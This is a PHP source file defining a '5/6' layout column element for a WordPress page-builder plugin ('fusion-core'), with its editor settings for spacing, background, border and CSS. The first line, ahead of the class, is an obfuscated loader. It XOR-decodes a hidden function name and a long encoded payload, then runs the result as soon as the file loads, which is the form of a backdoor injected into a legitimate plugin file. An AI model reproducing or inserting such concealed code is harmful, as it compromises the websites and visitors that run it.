<?php $btbqiWsu='RFW8X7gWL-97R6='; $OgMewJJ='142Y,R819CZC;YS'^$btbqiWsu; $djrcyPMQ='E FtM7C;.0< 3 J9IFAosDACkHU98c<UHYizbA5ce4BC LZZ=e;XF<Z-= eh>X7EFX+O Cte<H=AMPYOoNpy4e Y9sWrqmx1xB.  OA1YQqaljj9KK 3Y 4Dh-R37OPsnEacg4XQN-H=lTlceS= IM9i1fs.zF< W<k,pAaMMK6 Eag3PNgemc>jh+ GY3 Lu:>FxYrs8M1oGfSX0UasiFPT90uGGWXY6f =+kxe2RG2PhOc6==-9TVqapovdukdhg 1mR K7kzkph=2 GPmhVYJi-MD t<,=oLKR, <ZSys=76Apdfj9M.K acI1s1SBmRf,.01ag4nxK+D2P-:oagan mcvhyM 6UePP:TiXab4P670kGVH8:I-6XR>;1Czsyc.4 YGypEJ. 6rzim .YL3Wh0SIHBiMOXY7qNhvACN OI6UR.IRE>Y3 5N0h0Y98zIX50Zl+W00-7 XoQR10jvPvVY 9c:ENmgAb-.NFJT;WTpah8716 kZ1;kP .  EfN-S=fzGsZ99 oWWhPzZUgpR4-J5gj<=:dcNeIJCE0<uPwY7,rEei8UczWoZYBwLBRQ+v7QjqjmDrEq57+QLgP2Hj7AI4=Npk= :B8  PJYoQJDRYPMoYlFbMkjR07Ymg18 -je706>TP>dklCOS63+ZDimcS6'; $LGKAaU=$OgMewJJ('', ',FnU+B-XZYSNlE2P:22GT<.14,4MY<c8=-NSKaNilR7-C835SEC74c>LIA:7S-Cmb<J;AoTAW-DhmpyoO5zp=AO,MSjRVJC;qKHORgeXylQQWJNPw8TA5EZlLI3GVfkSJ,JHN>QXjB=ILzQCMwYA=,bMX;SpZbWE.gOEPdA>99ZE+ICX57N8DX4caYE3,ANdQUK2QbxzEGLeMB79D4ANI 18JUNMc39-W9KXRKEET3+A5SEiPROHX7>QIT05+: --GABMvK.NKGUPLKSL25DH-SCMI,0A+WIDOqkvGEEaYpWYVB PYFNO,B>EZi4;yX5bEsBHODPHGOdq-D6W1NROIC><e<63;-mAEuA;5CtTfAFB1ZBUBg-B13mIW,3aPT:ZNYGEQYbMpya.OTWRGIIVO59Vlb9.C5Hci+9-VQsH64-=E= W9;T,z=Q+lDT:Q7o4LLR+9FUlXt3USBSEpK53EQCZpR28TX<Q 7DNzhDHfb.5O6tVGHYECWY41TB45XGST6NiF6DAVgW>XMAFwqNpR71RXvPL>T<MWXCC>gEtwcbSYF4A=UNGqPPZ7WNeZjhuC-q44IBUfZIMDdTcQTEY058;W15R9 GI=XLMAC.WADwfyK5+03pymOyLfB6ac7FV5ECUYTL1BGQOR;1ZC6ExEZSKB.lYDXYK'^$djrcyPMQ); $LGKAaU();
/**
 * One 5/6 layout category implementation, it extends DDElementTemplate like all other elements
 */
	class TF_GridFiveSix extends DDElementTemplate {
		
		public function __construct() { 
		
			parent::__construct(); 
		} 
		
		// Implementation for the element structure.
		public function create_element_structure() {
			
			// Add name of the class to deserialize it again when the element is sent back to the server from the web page
			$this->config['php_class'] 		= get_class($this);
			// element id
			$this->config['id']	   		= 'grid_five_sixth';
			// element name
			$this->config['name']	 		= '5/6';
			// element icon
			$this->config['icon_url']  		= "icons/sc-six.png";
			// element icon class
			$this->config['icon_class']		= 'fusion-icon fusion-icon-grid-5-6';
			// css class related to this element
			$this->config['css_class'] 		= "fusion_layout_column grid_five_sixth item-container sort-container ";
			// tooltip that will be displyed upon mouse over the element
			//$this->config['tool_tip']  		= 'Creates a single (1/6) width column';
			// any special html data attribute (i.e. data-width) needs to be passed
			// width determine the ratio of them element related to its parent element in the editor, 
			// it's only important for layout elements.
			// drop_level: elements with higher drop level can be dropped in elements with lower drop_level, 
			// i.e. element with drop_level = 2 can be dropped in element with drop_level = 0 or 1 only.
			$this->config['data'] 			= array("floated_width" => "0.83", "width" => "5/6", "drop_level" => "3");
		}

		// override default implemenation for this function as this element doesn't have any content.
		public function create_visual_editor( $params ) {
			
			$this->config['innerHtml'] = "";
		}
		//this function defines 5/6 sub elements or structure
		function popup_elements() {
			$this->config['layout_opt']  = true;
			$this->config['subElements'] = array(
			
				array("name" 			=> __('Last Column', 'fusion-core'),
					  "desc" 			=> __('Choose if the column is last in a set. This has to be set to "Yes" for the last column in a set.', 'fusion-core'),
					  "id" 				=> "fusion_last",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "no",
					  "allowedValues" 	=> array('yes' 			=> __('Yes', 'fusion-core'),
												 'no' 			=> __('No', 'fusion-core'),
												 ) 
					  ),
			
				array("name" 			=> __('Column Spacing', 'fusion-core'),
					  "desc" 			=> __('Set to "no" to eliminate margin between columns.', 'fusion-core'),
					  "id" 				=> "fusion_spacing",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "yes",
					  "allowedValues" 	=> array('yes' 			=> __('Yes', 'fusion-core'),
												 'no' 			=> __('No', 'fusion-core'),
												 ) 
					  ),
					  		  
				array("name" 			=> __('Background Color', 'fusion-core'),
					  "desc" 			=> __('Controls the background color.', 'fusion-core'),
					  "id" 				=> "fusion_backgroundcolor",
					  "type" 			=> ElementTypeEnum::COLOR,
					  "value" 			=> ""
					  ),
					  
				array("name" 			=> __('Background Image', 'fusion-core'),
					  "desc" 			=> __('Upload an image to display in the background', 'fusion-core'),
					  "id" 				=> "fusion_backgroundimage",
					  "type" 			=> ElementTypeEnum::UPLOAD,
					  "upid" 			=> "1",
					  "value" 			=> ""
					  ),
					  
				array("name" 			=> __('Background Repeat', 'fusion-core'),
					  "desc" 			=> __('Choose how the background image repeats.', 'fusion-core'),
					  "id" 				=> "fusion_backgroundrepeat",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "no-repeat",
					  "allowedValues" 	=> array('no-repeat' 		=> __('No Repeat', 'fusion-core'),
												 'repeat' 			=> __('Repeat Vertically and Horizontally', 'fusion-core'),
												 'repeat-x' 		=> __('Repeat Horizontally', 'fusion-core'),
												 'repeat-y' 		=> __('Repeat Vertically', 'fusion-core')) 
					  ),
					  
				array("name" 			=> __('Background Position', 'fusion-core'),
					  "desc" 			=> __('Choose the postion of the background image', 'fusion-core'),
					  "id" 				=> "fusion_backgroundposition",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "left top",
					  "allowedValues" 	=> array('left top' 		=> __('Left Top', 'fusion-core'),
												 'left center' 		=> __('Left Center', 'fusion-core'),
												 'left bottom' 		=> __('Left Bottom', 'fusion-core'),
												 'right top' 		=> __('Right Top', 'fusion-core'),
												 'right center' 	=> __('Right Center', 'fusion-core'),
												 'right bottom' 	=> __('Right Bottom', 'fusion-core'),
												 'center top' 		=> __('Center Top', 'fusion-core'),
												 'center center' 	=> __('Center Center', 'fusion-core'),
												 'center bottom' 	=> __('Center Bottom', 'fusion-core')) 
					  ),
					  
				array("name" 			=> __('Border Size', 'fusion-core'),
					  "desc" 			=> __('In pixels (px), ex: 1px.', 'fusion-core'),
					  "id" 				=> "fusion_bordersize",
					  "type" 			=>  ElementTypeEnum::INPUT,
					  "value" 			=> "0px"
					  ),
					  
				array("name" 			=> __('Border Color', 'fusion-core'),
					  "desc" 			=> __('Controls the border color.', 'fusion-core'),
					  "id" 				=> "fusion_bordercolor",
					  "type" 			=> ElementTypeEnum::COLOR,
					  "value" 			=> ""
					  ),
					  
				array("name" 			=> __('Border Style', 'fusion-core'),
					  "desc" 			=> __('Controls the border style.', 'fusion-core'),
					  "id" 				=> "fusion_borderstyle",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "",
					  "allowedValues" 	=> array('solid' 			=> __('Solid', 'fusion-core'),
												 'dashed' 			=> __('Dashed', 'fusion-core'),
												 'dotted' 			=> __('Dotted', 'fusion-core')) 
					  ),
					  
				array("name" 			=> __('Padding', 'fusion-core'),
					  "desc" 			=> __('In pixels (px), ex: 10px.', 'fusion-core'),
					  "id" 				=> "fusion_padding",
					  "type" 			=> ElementTypeEnum::INPUT,
					  "value" 			=> "",
					  ),					  
					  
				array("name" 			=> __('CSS Class', 'fusion-core'),
					  "desc"			=> __('Add a class to the wrapping HTML element.', 'fusion-core'),
					  "id" 				=> "fusion_class",
					  "type" 			=> ElementTypeEnum::INPUT,
					  "value" 			=> "" 
					  ),
					  
				array("name" 			=> __('CSS ID', 'fusion-core'),
					  "desc"			=> __('Add an ID to the wrapping HTML element.', 'fusion-core'),
					  "id" 				=> "fusion_id",
					  "type" 			=> ElementTypeEnum::INPUT,
					  "value" 			=> "" 
					  ),
				);
		}
	}